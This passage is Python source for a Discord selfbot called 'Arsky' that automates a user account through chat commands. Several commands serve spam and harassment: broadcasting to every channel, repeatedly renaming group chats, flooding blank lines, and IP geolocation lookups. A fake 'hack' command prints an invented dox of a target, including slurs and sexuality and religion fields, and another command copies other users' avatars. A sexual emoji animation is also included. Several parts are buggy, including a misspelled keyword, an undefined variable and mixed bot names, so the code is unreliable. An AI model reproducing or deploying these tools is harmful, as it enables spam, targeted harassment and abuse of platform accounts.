  @Arsky.command(aliases=["jerkoff", "ejaculate", "orgasm"])
  async def cum(ctx):
      await ctx.message.delete()
      message = await ctx.send('''
              :ok_hand:            :smile:
    :eggplant: :zzz: :necktie: :eggplant: 
                    :oil:     :nose:
                  :zap: 8=:punch:=D 
              :trumpet:      :eggplant:''')
      await asyncio.sleep(0.5)
      await message.edit(content='''
                        :ok_hand:            :smiley:
    :eggplant: :zzz: :necktie: :eggplant: 
                    :oil:     :nose:
                  :zap: 8==:punch:D 
              :trumpet:      :eggplant:  
      ''')
      await asyncio.sleep(0.5)
      await message.edit(content='''
                        :ok_hand:            :grimacing:
    :eggplant: :zzz: :necktie: :eggplant: 
                    :oil:     :nose:
                  :zap: 8=:punch:=D 
              :trumpet:      :eggplant:  
      ''')
      await asyncio.sleep(0.5)
      await message.edit(content='''
                        :ok_hand:            :persevere:
    :eggplant: :zzz: :necktie: :eggplant: 
                    :oil:     :nose:
                  :zap: 8==:punch:D 
              :trumpet:      :eggplant:   
      ''')
      await asyncio.sleep(0.5)
      await message.edit(content='''
                        :ok_hand:            :confounded:
    :eggplant: :zzz: :necktie: :eggplant: 
                    :oil:     :nose:
                  :zap: 8=:punch:=D 
              :trumpet:      :eggplant: 
      ''')
      await asyncio.sleep(0.5)
      await message.edit(content='''
                        :ok_hand:            :tired_face:
    :eggplant: :zzz: :necktie: :eggplant: 
                    :oil:     :nose:
                  :zap: 8==:punch:D 
              :trumpet:      :eggplant:    
              ''')
      await asyncio.sleep(0.5)
      await message.edit(contnet='''
                        :ok_hand:            :weary:
    :eggplant: :zzz: :necktie: :eggplant: 
                    :oil:     :nose:
                  :zap: 8=:punch:= D:sweat_drops:
              :trumpet:      :eggplant:        
      ''')
      await asyncio.sleep(0.5)
      await message.edit(content='''
                        :ok_hand:            :dizzy_face:
    :eggplant: :zzz: :necktie: :eggplant: 
                    :oil:     :nose:
                  :zap: 8==:punch:D :sweat_drops:
              :trumpet:      :eggplant:                 :sweat_drops:
      ''')
      await asyncio.sleep(0.5)
      await message.edit(content='''
                        :ok_hand:            :drooling_face:
    :eggplant: :zzz: :necktie: :eggplant: 
                    :oil:     :nose:
                  :zap: 8==:punch:D :sweat_drops:
              :trumpet:      :eggplant:                 :sweat_drops:
      ''')


  @Arsky.command()
  async def clear(ctx):
      await ctx.message.delete()
      await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')


  @Arsky.command()
  async def sendall(ctx, *, message):
      await ctx.message.delete()
      try:
          channels = ctx.guild.text_channels
          for channel in channels:
              await channel.send(message)
      except:
          pass


  @Arsky.command(aliases=["spamchangegcname", "changegcname"])
  async def spamgcname(ctx):
      await ctx.message.delete()
      if isinstance(ctx.message.channel, discord.GroupChannel):
          watermark = "Arsky LOL"
          name = ""
          for letter in watermark:
              name = name + letter
              await ctx.message.channel.edit(name=name)


  @Arsky.command(aliases=["fakename"])
  async def genname(ctx):
      await ctx.message.delete()
      first, second = random.choices(ctx.guild.members, k=2)
      first = first.display_name[len(first.display_name) // 2:]
      second = second.display_name[:len(second.display_name) // 2]
      await ctx.send(discord.utils.escape_mentions(second + first))


  @Arsky.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
  async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
      await ctx.message.delete()
      r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
      geo = r.json()
      em = discord.Embed()
      fields = [
          {'name': 'IP', 'value': geo['query']},
          {'name': 'Type', 'value': geo['ipType']},
          {'name': 'Country', 'value': geo['country']},
          {'name': 'City', 'value': geo['city']},
          {'name': 'Continent', 'value': geo['continent']},
          {'name': 'Country', 'value': geo['country']},
          {'name': 'Hostname', 'value': geo['ipName']},
          {'name': 'ISP', 'value': geo['isp']},
          {'name': 'Latitute', 'value': geo['lat']},
          {'name': 'Longitude', 'value': geo['lon']},
          {'name': 'Org', 'value': geo['org']},
          {'name': 'Region', 'value': geo['region']},
      ]
      for field in fields:
          if field['value']:
              em.add_field(name=field['name'], value=field['value'], inline=True)
      return await ctx.send(embed=em)

  @Arsky.command()
  async def pingweb(ctx, website=None):
      await ctx.message.delete()
      if website is None:
          pass
      else:
          try:
              r = requests.get(website).status_code
          except Exception as e:
              print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
          if r == 404:
              await ctx.send(f'Website is down ({r})', delete_after=3)
          else:
              await ctx.send(f'Website is operational ({r})', delete_after=3)


  @Arsky.command()
  async def tweet(ctx, username: str = None, *, message: str = None):
      await ctx.message.delete()
      if username is None or message is None:
          await ctx.send("missing parameters")
          return
      async with aiohttp.ClientSession() as cs:
          async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
              res = await r.json()
              try:
                  async with aiohttp.ClientSession() as session:
                      async with session.get(str(res['message'])) as resp:
                          image = await resp.read()
                  with io.BytesIO(image) as file:
                      await ctx.send(file=discord.File(file, f"exeter_tweet.png"))
              except:
                  await ctx.send(res['message'])


  @Arsky.command(aliases=["distort"])
  async def magik(ctx, user: discord.Member = None):
      await ctx.message.delete()
      endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
      if user is None:
          avatar = str(ctx.author.avatar_url_as(format="png"))
          endpoint += avatar
          r = requests.get(endpoint)
          res = r.json()
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(str(res['message'])) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_magik.png"))
          except:
              await ctx.send(res['message'])
      else:
          avatar = str(user.avatar_url_as(format="png"))
          endpoint += avatar
          r = requests.get(endpoint)
          res = r.json()
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(str(res['message'])) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_magik.png"))
          except:
              await ctx.send(res['message'])


  @Arsky.command(aliases=['markasread', 'ack'])
  async def read(ctx):
      await ctx.message.delete()
      for guild in Arsky.guilds:
          await guild.ack()


  @Arsky.command(aliases=["deepfry"])
  async def fry(ctx, user: discord.Member = None):
      await ctx.message.delete()
      endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
      if user is None:
          avatar = str(ctx.author.avatar_url_as(format="png"))
          endpoint += avatar
          r = requests.get(endpoint)
          res = r.json()
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(str(res['message'])) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_fry.png"))
          except:
              await ctx.send(res['message'])
      else:
          avatar = str(user.avatar_url_as(format="png"))
          endpoint += avatar
          r = requests.get(endpoint)
          res = r.json()
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(str(res['message'])) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_fry.png"))
          except:
              await ctx.send(res['message'])


  @Arsky.command()
  async def blur(ctx, user: discord.Member = None):
      await ctx.message.delete()
      endpoint = "https://api.alexflipnote.dev/filter/blur?image="
      if user is None:
          avatar = str(ctx.author.avatar_url_as(format="png"))
          endpoint += avatar
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(endpoint) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_blur.png"))
          except:
              await ctx.send(endpoint)
      else:
          avatar = str(user.avatar_url_as(format="png"))
          endpoint += avatar
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(endpoint) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_blur.png"))
          except:
              await ctx.send(endpoint)


  @Arsky.command(aliases=["pixel"])
  async def pixelate(ctx, user: discord.Member = None):
      await ctx.message.delete()
      endpoint = "https://api.alexflipnote.dev/filter/pixelate?image="
      if user is None:
          avatar = str(ctx.author.avatar_url_as(format="png"))
          endpoint += avatar
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(endpoint) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_blur.png"))
          except:
              await ctx.send(endpoint)
      else:
          avatar = str(user.avatar_url_as(format="png"))
          endpoint += avatar
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(endpoint) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_blur.png"))
          except:
              await ctx.send(endpoint)


  @Arsky.command()
  async def supreme(ctx, *, args=None):
      await ctx.message.delete()
      if args is None:
          await ctx.send("missing parameters")
          return
      endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20")
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(endpoint) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_supreme.png"))
      except:
          await ctx.send(endpoint)


  @Arsky.command()
  async def darksupreme(ctx, *, args=None):
      await ctx.message.delete()
      if args is None:
          await ctx.send("missing parameters")
          return
      endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20") + "&dark=true"
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(endpoint) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_dark_supreme.png"))
      except:
          await ctx.send(endpoint)


  @Arsky.command(aliases=["facts"])
  async def fax(ctx, *, args=None):
      await ctx.message.delete()
      if args is None:
          await ctx.send("missing parameters")
          return
      endpoint = "https://api.alexflipnote.dev/facts?text=" + args.replace(" ", "%20")
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(endpoint) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_facts.png"))
      except:
          await ctx.send(endpoint)


  @Arsky.command(aliases=["blurp"])
  async def blurpify(ctx, user: discord.Member = None):
      await ctx.message.delete()
      endpoint = "https://nekobot.xyz/api/imagegen?type=blurpify&image="
      if user is None:
          avatar = str(ctx.author.avatar_url_as(format="png"))
          endpoint += avatar
          r = requests.get(endpoint)
          res = r.json()
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(str(res['message'])) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_blurpify.png"))
          except:
              await ctx.send(res['message'])
      else:
          avatar = str(user.avatar_url_as(format="png"))
          endpoint += avatar
          r = requests.get(endpoint)
          res = r.json()
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(str(res['message'])) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_blurpify.png"))
          except:
              await ctx.send(res['message'])


  @Arsky.command()
  async def invert(ctx, user: discord.Member = None):
      await ctx.message.delete()
      endpoint = "https://api.alexflipnote.dev/filter/invert?image="
      if user is None:
          avatar = str(ctx.author.avatar_url_as(format="png"))
          endpoint += avatar
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(endpoint) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_invert.png"))
          except:
              await ctx.send(endpoint)
      else:
          avatar = str(user.avatar_url_as(format="png"))
          endpoint += avatar
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(endpoint) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_invert.png"))
          except:
              await ctx.send(endpoint)


  @Arsky.command()
  async def gay(ctx, user: discord.Member = None):
      await ctx.message.delete()
      endpoint = "https://api.alexflipnote.dev/filter/gay?image="
      if user is None:
          avatar = str(ctx.author.avatar_url_as(format="png"))
          endpoint += avatar
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(endpoint) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_invert.png"))
          except:
              await ctx.send(endpoint)
      else:
          avatar = str(user.avatar_url_as(format="png"))
          endpoint += avatar
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(endpoint) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_invert.png"))
          except:
              await ctx.send(endpoint)


  @Arsky.command()
  async def communist(ctx, user: discord.Member = None):
      await ctx.message.delete()
      endpoint = "https://api.alexflipnote.dev/filter/communist?image="
      if user is None:
          avatar = str(ctx.author.avatar_url_as(format="png"))
          endpoint += avatar
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(endpoint) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_invert.png"))
          except:
              await ctx.send(endpoint)
      else:
          avatar = str(user.avatar_url_as(format="png"))
          endpoint += avatar
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(endpoint) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_invert.png"))
          except:
              await ctx.send(endpoint)


  @Arsky.command()
  async def snow(ctx, user: discord.Member = None):
      await ctx.message.delete()
      endpoint = "https://api.alexflipnote.dev/filter/snow?image="
      if user is None:
          avatar = str(ctx.author.avatar_url_as(format="png"))
          endpoint += avatar
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(endpoint) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_invert.png"))
          except:
              await ctx.send(endpoint)
      else:
          avatar = str(user.avatar_url_as(format="png"))
          endpoint += avatar
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(endpoint) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_invert.png"))
          except:
              await ctx.send(endpoint)


  @Arsky.command(aliases=["jpeg"])
  async def jpegify(ctx, user: discord.Member = None):
      await ctx.message.delete()
      endpoint = "https://api.alexflipnote.dev/filter/jpegify?image="
      if user is None:
          avatar = str(ctx.author.avatar_url_as(format="png"))
          endpoint += avatar
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(endpoint) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_invert.png"))
          except:
              await ctx.send(endpoint)
      else:
          avatar = str(user.avatar_url_as(format="png"))
          endpoint += avatar
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(endpoint) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(file=discord.File(file, f"exeter_invert.png"))
          except:
              await ctx.send(endpoint)


  @Arsky.command(aliases=["pornhublogo", "phlogo"])
  async def pornhub(ctx, word1=None, word2=None):
      await ctx.message.delete()
      if word1 is None or word2 is None:
          await ctx.send("missing parameters")
          return
      endpoint = "https://api.alexflipnote.dev/pornhub?text={text-1}&text2={text-2}".replace("{text-1}", word1).replace(
          "{text-2}", word2)
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(endpoint) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_pornhub_logo.png"))
      except:
          await ctx.send(endpoint)


  @Arsky.command(aliases=["pornhubcomment", 'phc'])
  async def phcomment(ctx, user: str = None, *, args=None):
      await ctx.message.delete()
      if user is None or args is None:
          await ctx.send("missing parameters")
          return
      endpoint = "https://nekobot.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
          ctx.author.avatar_url_as(format="png"))
      r = requests.get(endpoint)
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res["message"]) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_pornhub_comment.png"))
      except:
          await ctx.send(res["message"])


  @Arsky.command()
  async def token(ctx, user: discord.Member = None):
      await ctx.message.delete()
      list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
              "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o',
              'p', 'q', 'r', 's', 't', 'u',
              'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
      token = random.choices(list, k=59)
      print(token)
      if user is None:
          user = ctx.author
          await ctx.send(user.mention + "'s token is " + ''.join(token))
      else:
          await ctx.send(user.mention + "'s token is " + "".join(token))


  @Arsky.command()
  async def hack(ctx, user: discord.Member = None):
      await ctx.message.delete()
      gender = ["Male", "Female", "Trans", "Other", "Retard"]
      age = str(random.randrange(10, 25))
      height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
                '5\'4\"', '5\'5\"',
                '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
                '6\'4\"', '6\'5\"',
                '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
      weight = str(random.randrange(60, 300))
      hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
      skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
      religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
      sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
      education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                  "Retard never went to school LOL"]
      ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                  "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
      occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                    "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                    "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                    "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
      salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
                "$125,000", "$150,000", "$175,000",
                "$200,000+"]
      location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                  "Russia", "Pakistan", "India",
                  "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
                  "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                  "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                  "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                  "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                  "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                  "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
      email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
              "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
      dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
      name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
              "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
              "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
              "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
              "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
              "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
              "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
              "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
              "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
      phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
      if user is None:
          user = ctx.author
          password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                      "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                      "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
          message = await ctx.send(f"`Hacking {user}...\n`")
          await asyncio.sleep(1)
          await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
          await asyncio.sleep(1)
          await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
      else:
          password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                      "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                      "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
          message = await ctx.send(f"`Hacking {user}...\n`")
          await asyncio.sleep(1)
          await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
          await asyncio.sleep(1)
          await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")


  @Arsky.command(aliases=["reversesearch", "anticatfish", "catfish"])
  async def revav(ctx, user: discord.Member = None):
      await ctx.message.delete()
      if user is None:
          user = ctx.author
      try:
          em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
          await ctx.send(embed=em)
      except Exception as e:
          print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


  @Arsky.command(aliases=['pfp', 'avatar'])
  async def av(ctx, *, user: discord.Member = None):
      format = "gif"
      user = user or ctx.author
      if user.is_avatar_animated() != True:
          format = "png"
      avatar = user.avatar_url_as(format=format if format != "gif" else None)
      async with aiohttp.ClientSession() as session:
          async with session.get(str(avatar)) as resp:
              image = await resp.read()
      with io.BytesIO(image) as file:
          await ctx.send(file=discord.File(file, f"Avatar.{format}"))


  @Arsky.command()
  async def whois(ctx, *, user: discord.Member = None):
      await ctx.message.delete()
      if user is None:
          user = ctx.author
      if isinstance(ctx.message.channel, discord.Guild):
          date_format = "%a, %d %b %Y %I:%M %p"
          em = discord.Embed(description=user.mention)
          em.set_author(name=str(user), icon_url=user.avatar_url)
          em.set_thumbnail(url=user.avatar_url)
          em.add_field(name="Registered", value=user.created_at.strftime(date_format))
          em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
          members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
          em.add_field(name="Join position", value=str(members.index(user) + 1))
          if len(user.roles) > 1:
              role_string = ' '.join([r.mention for r in user.roles][1:])
              em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
          perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
          em.add_field(name="Permissions", value=perm_string, inline=False)
          em.set_footer(text='ID: ' + str(user.id))
          return await ctx.send(embed=em)
      else:
          date_format = "%a, %d %b %Y %I:%M %p"
          em = discord.Embed(description=user.mention)
          em.set_author(name=str(user), icon_url=user.avatar_url)
          em.set_thumbnail(url=user.avatar_url)
          em.add_field(name="Created", value=user.created_at.strftime(date_format))
          em.set_footer(text='ID: ' + str(user.id))
          return await ctx.send(embed=em)


  @Arsky.command(aliases=["del", "quickdel"])
  async def quickdelete(ctx, *, args):
      await ctx.message.delete()
      await ctx.send(args, delete_after=1)


  @Arsky.command()
  async def minesweeper(ctx, size: int = 5):
      await ctx.message.delete()
      size = max(min(size, 8), 2)
      bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
      is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
      has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
      message = "**Click to play**:\n"
      for y in range(size):
          for x in range(size):
              tile = "||{}||".format(chr(11036))
              if has_bomb(x, y):
                  tile = "||{}||".format(chr(128163))
              else:
                  count = 0
                  for xmod, ymod in m_offets:
                      if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                          count += 1
                  if count != 0:
                      tile = "||{}||".format(m_numbers[count - 1])
              message += tile
          message += "\n"
      await ctx.send(message)


  @Arsky.command(name='1337speak', aliases=['leetspeak'])
  async def _1337_speak(ctx, *, text):
      await ctx.message.delete()
      text = text.replace('a', '4').replace('A', '4').replace('e', '3') \
          .replace('E', '3').replace('i', '!').replace('I', '!') \
          .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
      await ctx.send(f'{text}')


  @Arsky.command()
  async def ghost(ctx):
      await ctx.message.delete()
      if config.get('password') == 'password-here':
          print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
      else:
          password = config.get('password')
          with open('Images/Avatars/Transparent.png', 'rb') as f:
              try:
                  await Exeter.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
              except discord.HTTPException as e:
                  print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


  @Arsky.command(aliases=['pfpget', 'stealpfp'])
  async def pfpsteal(ctx, user: discord.Member):
      await ctx.message.delete()
      if config.get('password') == 'password-here':
          print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
      else:
          password = config.get('password')
          with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
              r = requests.get(user.avatar_url, stream=True)
              for block in r.iter_content(1024):
                  if not block:
                      break
                  f.write(block)
          try:
              Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
              with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
                  await Exeter.user.edit(password=password, avatar=f.read())
          except discord.HTTPException as e:
              print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


  @Arsky.command(name='set-pfp', aliases=['setpfp', 'pfpset,"changepfp'])
  async def _set_pfp(ctx, *, url):
      await ctx.message.delete()
      if config.get('password') == 'password-here':
          print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
      else:
          password = config.get('password')
          with open('Images/Avatars/PFP-1.png', 'wb') as f:
              r = requests.get(url, stream=True)
              for block in r.iter_content(1024):
                  if not block:
                      break
                  f.write(block)
      try:
          Image.open('Images/Avatars/PFP-1.png').convert('RGB')
          with open('Images/Avatars/PFP-1.png', 'rb') as f:
              await Arsky.user.edit(password=password, avatar=f.read())
      except discord.HTTPException as e:
          print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


